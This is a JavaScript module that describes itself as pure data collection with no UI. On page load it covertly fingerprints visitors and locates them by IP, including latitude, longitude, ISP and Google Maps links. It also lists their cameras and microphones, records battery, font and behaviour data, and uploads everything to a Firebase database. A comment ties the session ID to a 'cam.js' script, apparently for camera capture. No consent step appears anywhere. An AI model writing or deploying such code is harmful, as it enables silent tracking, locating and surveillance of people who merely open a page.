/**
 * Metadata & Browser Fingerprinting Module
 * Generates browser fingerprint automatically and stores in memory
 * No UI elements - pure data collection
 */

let behaviorData = { clicks: 0, scrolls: 0, mouseMoves: 0 };
let currentSessionData = null;

// Track user behavior
document.addEventListener("click", () => behaviorData.clicks++);
document.addEventListener("scroll", () => behaviorData.scrolls++);
document.addEventListener("mousemove", () => behaviorData.mouseMoves++);

/**
 * Generate canvas fingerprint
 */
function getCanvasHash() {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "16px Arial";
    ctx.fillStyle = "#f60";
    ctx.fillRect(0, 0, 100, 30);
    ctx.fillStyle = "#069";
    ctx.fillText("Fingerprint-Test", 2, 15);
    return canvas.toDataURL();
}

/**
 * Get approximate location from IP address using geolocation service
 */
async function getIPLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        const locationObj = {
            ip: data.ip,
            city: data.city,
            region: data.region,
            country: data.country_name,
            latitude: data.latitude,
            longitude: data.longitude,
            timezone: data.timezone,
            isp: data.org
        };
        
        // Generate Google Maps link if coordinates are available
        if (data.latitude && data.longitude) {
            locationObj.mapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
            locationObj.mapsSearchLink = `https://www.google.com/maps/search/${data.city}+${data.region}+${data.country_name}/@${data.latitude},${data.longitude}`;
        }
        
        return locationObj;
    } catch (error) {
        console.warn("Could not fetch IP location:", error);
        return null;
    }
}

/**
 * Get WebGL information
 */
function getWebGLInfo() {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl");
    if (!gl) return "WebGL Not Supported";
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (!debugInfo) return "Debug Info Not Available";
    return {
        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
    };
}

/**
 * Get list of available media devices without accessing them
 */
async function getMediaDevices() {
    try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const grouped = {
            cameras: [],
            microphones: [],
            speakers: [],
            other: []
        };
        
        devices.forEach(device => {
            const info = { deviceId: device.deviceId, label: device.label };
            if (device.kind === 'videoinput') grouped.cameras.push(info);
            else if (device.kind === 'audioinput') grouped.microphones.push(info);
            else if (device.kind === 'audiooutput') grouped.speakers.push(info);
            else grouped.other.push(info);
        });
        
        return grouped;
    } catch (error) {
        return { error: "Media devices enumeration not available" };
    }
}

/**
 * Detect available system fonts
 */
function getSystemFonts() {
    const testFonts = [
        'Arial', 'Courier New', 'Georgia', 'Helvetica', 'Times New Roman', 'Verdana',
        'Comic Sans MS', 'Trebuchet MS', 'Palatino', 'Garamond', 'Bookman',
        'Consolas', 'Segoe UI', 'Tahoma', 'Lucida Console', 'MS Serif'
    ];
    
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const originalFont = '72px monospace';
    const testString = 'mmmmmmmmmmlli';
    
    const f = () => {
        ctx.font = originalFont;
        return ctx.measureText(testString).width;
    };
    
    const baseWidth = f();
    const detected = [];
    
    testFonts.forEach(font => {
        ctx.font = `72px ${font}, monospace`;
        if (ctx.measureText(testString).width !== baseWidth) {
            detected.push(font);
        }
    });
    
    return detected;
}

/**
 * Get battery and charging information
 */
async function getBatteryInfo() {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return {
                level: battery.level,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        }
        return null;
    } catch (error) {
        return null;
    }
}

/**
 * Get storage and quota information
 */
async function getStorageInfo() {
    try {
        const estimate = await navigator.storage.estimate();
        return {
            usage: estimate.usage,
            quota: estimate.quota,
            percentage: Math.round((estimate.usage / estimate.quota) * 100)
        };
    } catch (error) {
        return null;
    }
}

/**
 * Get system capabilities and feature support
 */
function getSystemCapabilities() {
    return {
        webWorker: typeof Worker !== 'undefined',
        serviceWorker: 'serviceWorker' in navigator,
        webAssembly: typeof WebAssembly !== 'undefined',
        webGL: !!(window.WebGLRenderingContext),
        indexedDB: !!window.indexedDB,
        localStorage: !!window.localStorage,
        sessionStorage: !!window.sessionStorage,
        geolocation: 'geolocation' in navigator,
        vibration: 'vibrate' in navigator,
        notification: 'Notification' in window,
        paymentRequest: 'PaymentRequest' in window,
        speechRecognition: 'webkitSpeechRecognition' in window || 'SpeechRecognition' in window,
        audioContext: !!(window.AudioContext || window.webkitAudioContext),
        doNotTrack: navigator.doNotTrack,
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine
    };
}

/**
 * Get performance metrics
 */
function getPerformanceMetrics() {
    if (!window.performance || !window.performance.timing) return null;
    
    const timing = performance.timing;
    return {
        pageLoadTime: timing.loadEventEnd - timing.navigationStart,
        domReadyTime: timing.domContentLoadedEventEnd - timing.navigationStart,
        resourceLoadTime: timing.loadEventEnd - timing.domContentLoadedEventEnd,
        serverResponseTime: timing.responseEnd - timing.requestStart,
        renderTime: timing.domInteractive - timing.domLoading
    };
}

/**
 * SHA-256 hash function
 */
async function sha256(str) {
    const buffer = new TextEncoder().encode(str);
    const hashBuffer = await crypto.subtle.digest("SHA-256", buffer);
    return Array.from(new Uint8Array(hashBuffer))
        .map(b => b.toString(16).padStart(2, "0"))
        .join("");
}

/**
 * Sanitize metadata to remove Infinity and invalid values for Firebase
 */
function sanitizeMetadata(obj) {
    if (obj === null || obj === undefined) return null;
    
    if (typeof obj !== 'object') {
        // Handle Infinity values
        if (!isFinite(obj) && typeof obj === 'number') {
            return null; // Convert Infinity to null
        }
        return obj;
    }
    
    if (Array.isArray(obj)) {
        return obj.map(item => sanitizeMetadata(item)).filter(item => item !== undefined);
    }
    
    const sanitized = {};
    for (const key in obj) {
        if (Object.prototype.hasOwnProperty.call(obj, key)) {
            const value = obj[key];
            
            // Skip undefined values
            if (value === undefined) continue;
            
            // Handle Infinity
            if (!isFinite(value) && typeof value === 'number') {
                sanitized[key] = null;
            } else if (typeof value === 'object') {
                sanitized[key] = sanitizeMetadata(value);
            } else {
                sanitized[key] = value;
            }
        }
    }
    return sanitized;
}

/**
 * Generate complete browser fingerprint
 */
async function generateFingerprint() {
    // Collect all metadata (some async, some sync)
    const [locationData, mediaDevices, systemFonts, batteryInfo, storageInfo, capabilities, performance] = await Promise.all([
        getIPLocation(),
        getMediaDevices(),
        Promise.resolve(getSystemFonts()),
        getBatteryInfo(),
        getStorageInfo(),
        Promise.resolve(getSystemCapabilities()),
        Promise.resolve(getPerformanceMetrics())
    ]);

    const metadata = {
        timestamp: new Date().toISOString(),

        // Location data (from IP)
        location: locationData,

        browser: {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            cookiesEnabled: navigator.cookieEnabled,
            onlineStatus: navigator.onLine,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory || "NA",
            maxTouchPoints: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            appVersion: navigator.appVersion
        },

        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation ? screen.orientation.type : "Unknown"
        },

        window: {
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            devicePixelRatio: window.devicePixelRatio
        },

        timezone: {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            offset: new Date().getTimezoneOffset()
        },

        network: navigator.connection ? {
            downlink: navigator.connection.downlink,
            effectiveType: navigator.connection.effectiveType,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData
        } : "Not Supported",

        plugins: Array.from(navigator.plugins).map(p => ({ name: p.name, description: p.description })),

        mediaDevices: mediaDevices,
        systemFonts: systemFonts,
        battery: batteryInfo,
        storage: storageInfo,
        capabilities: capabilities,
        performance: performance,

        behavior: behaviorData,

        // Fingerprints for uniqueness
        canvasHash: getCanvasHash(),
        webGL: getWebGLInfo()
    };

    const fingerprintHash = await sha256(JSON.stringify(metadata));
    metadata.fingerprint = fingerprintHash;

    currentSessionData = metadata;
    
    console.log("✨ Browser fingerprint generated:", fingerprintHash);
    console.log("📊 Full metadata collected:", metadata);

    return metadata;
}

/**
 * Get current session data
 */
function getSessionData() {
    return currentSessionData;
}

/**
 * Get fingerprint hash
 */
function getFingerprintHash() {
    return currentSessionData ? currentSessionData.fingerprint : null;
}

/**
 * Get Google Maps link for the user's location
 */
function getLocationMapsLink() {
    if (currentSessionData && currentSessionData.location && currentSessionData.location.mapsLink) {
        return currentSessionData.location.mapsLink;
    }
    return null;
}

/**
 * Get detailed Google Maps search link
 */
function getLocationMapsSearchLink() {
    if (currentSessionData && currentSessionData.location && currentSessionData.location.mapsSearchLink) {
        return currentSessionData.location.mapsSearchLink;
    }
    return null;
}

// Automatically generate fingerprint and upload metadata when page loads
window.addEventListener('load', async () => {
    try {
        const metadata = await generateFingerprint();
        
        // Generate unique session ID
        sessionId = generateSessionId();
        
        // Export sessionId to window so cam.js can access it
        window.sessionId = sessionId;
        
        // Sanitize metadata to remove Infinity values that Firebase doesn't accept
        const sanitizedMetadata = sanitizeMetadata({
            ...metadata,
            sessionId: sessionId,
            uploadedAt: new Date().toISOString()
        });
        
        // Upload metadata to Firebase Realtime Database
        await uploadToDatabase(`sessions/${sessionId}/metadata`, sanitizedMetadata);
        
        console.log(`🚀 Metadata uploaded for session: ${sessionId}`);
    } catch (error) {
        console.error('⚠️ Failed to upload metadata:', error);
    }
});
